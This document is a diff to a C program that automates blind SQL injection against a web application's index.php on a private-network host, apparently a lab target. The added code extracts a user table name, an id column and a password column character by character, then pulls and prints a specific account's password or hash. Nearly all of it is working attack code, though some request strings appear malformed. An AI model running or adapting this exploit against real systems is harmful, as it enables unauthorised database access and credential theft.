@@ -204,12 +204,9 @@ bool recv_empty(int32_t sockfd) {
     return ptr;
 }
 
-bool send_check_success(const char * discovered_name, int i, const char *mid, int sockfd) {
+bool send_check_success(const char * discovered_name, int i, const char *mid, int sockfd, const char *req) {
     char mal_req[2048];
-    sprintf(mal_req, "GET /index.php?order_id=0%%20UNION%%20SELECT%%20table_name%%20FROM%%20information_schema.TABLES%%20WHERE%%20table_name%%20LIKE%%20%%27%%25usr%%25%%27%%20AND%%20table_name%%20LIKE%%20%%27%s%%25%%27%%20AND%%20SUBSTR(table_name,%i,1)<%%3d%%27%s%%27%%20LIMIT%%201; HTTP/1.1\r\n"
-        "Host: 192.168.1.202\r\n"
-        "Connection: Keep-Alive\r\n"
-        "\r\n",
+    sprintf(mal_req, req,
         discovered_name, i + 1, mid
     );
 
@@ -272,7 +269,7 @@ const char *url_map[96] = {
     "%7F"  // 0x7F DEL
 };
 
-void binary_search(char final_discovered_name[11], int sockfd) {
+void binary_search(char final_discovered_name[11], int sockfd, const char *req) {
 #ifdef __MY_DEBUG__
     int count = 0;
 #endif
@@ -290,7 +287,7 @@ void binary_search(char final_discovered_name[11], int sockfd) {
         #ifdef __MY_DEBUG__
             count++;
         #endif
-            if (send_check_success(discovered_name, i, url_map[mid], sockfd)) {
+            if (send_check_success(discovered_name, i, url_map[mid], sockfd, req)) {
                 high=mid;
             }
             else {
@@ -318,7 +315,69 @@ int32_t main() {
 
     char table_name[11] = {0};
 
-    binary_search(table_name, sockfd);
+    const char *table_req = "GET /index.php?order_id=0%%20UNION%%20SELECT%%20table_name%%20FROM%%20information_schema.TABLES%%20WHERE%%20table_name%%20LIKE%%20%%27%%25usr%%25%%27%%20AND%%20table_name%%20LIKE%%20%%27%s%%25%%27%%20AND%%20SUBSTR(table_name,%i,1)<%%3d%%27%s%%27%%20LIMIT%%201;"
+        " HTTP/1.1\r\n"
+        "Host: 192.168.1.202\r\n"
+        "Connection: Keep-Alive\r\n"
+        "\r\n";
+
+    binary_search(table_name, sockfd, table_req);
+
+    char id_buf[2048] = "GET /index.php?order_id=SELECT%%20column_name%%20FROM%%20information_schema.COLUMNS%%20WHERE%%20table_name%%3d%%27";
+
+    const char *id_req_end = "%%27%%20AND%%20column_name%%20LIKE%%20%%27%%25id%%25%%27%%20AND%%20SUBSTR(column_name,%i,1)<%%3d%%27%s%%27%%20LIMIT%%201;"
+       " HTTP/1.1\r\n"
+        "Host: 192.168.1.202\r\n"
+        "Connection: Keep-Alive\r\n"
+        "\r\n";
+
+    strcat(id_buf, table_name);
+    strcat(id_buf, id_req_end);
+
+    char id_name[11] = {0};
+
+    binary_search(id_name, sockfd, id_buf);
+
+    char pwd_buf[2048] = "SELECT%%20column_name%%20FROM%%20information_schema.COLUMNS%%20WHERE%%20table_name%%3d%%27";
+    const char * pwd_req_end = "%%27%%20AND%%20column_name%%20LIKE%%20%%27%%25pwd%%25%%27%%20AND%%20SUBSTR(column_name,%i,1)<%%3d%%27%s%%27%%20LIMIT%%201"
+        " HTTP/1.1\r\n"
+        "Host: 192.168.1.202\r\n"
+        "Connection: Keep-Alive\r\n"
+        "\r\n";
+
+    strcat(pwd_buf, table_name);
+    strcat(pwd_buf, pwd_req_end);
+
+    char pwd_name[11] = {0};
+
+    binary_search(pwd_name, sockfd, pwd_buf);
+
+    char password_buf[4096] = "GET /index.php?order_id=0%%20UNION%%20SELECT%%20";
+
+        strcat(password_buf, pwd_name);
+        strcat(password_buf, "%%20FROM%%20");
+        strcat(password_buf, table_name);
+        strcat(password_buf, "%%20WHERE%%20");
+        strcat(password_buf, id_name);
+        strcat(password_buf, "%%3d322695107%%20AND%%20SUBSTR(");
+        strcat(password_buf, pwd_name);
+        const char *password_req_end = ",%i,1)<%%3d%%27%s%%27%%20LIMIT%%201;"
+            " HTTP/1.1\r\n"
+            "Host: 192.168.1.202\r\n"
+            "Connection: Keep-Alive\r\n"
+            "\r\n";
+
+        strcat(password_buf, password_req_end);
+
+        char final_password[11] = {0};
+
+        binary_search(final_password, sockfd, password_buf);
+
+        printf("Found Password/Hash: %s\n", final_password);
+
+
+
+
 
 #ifdef __MY_DEBUG__
     puts(table_name);
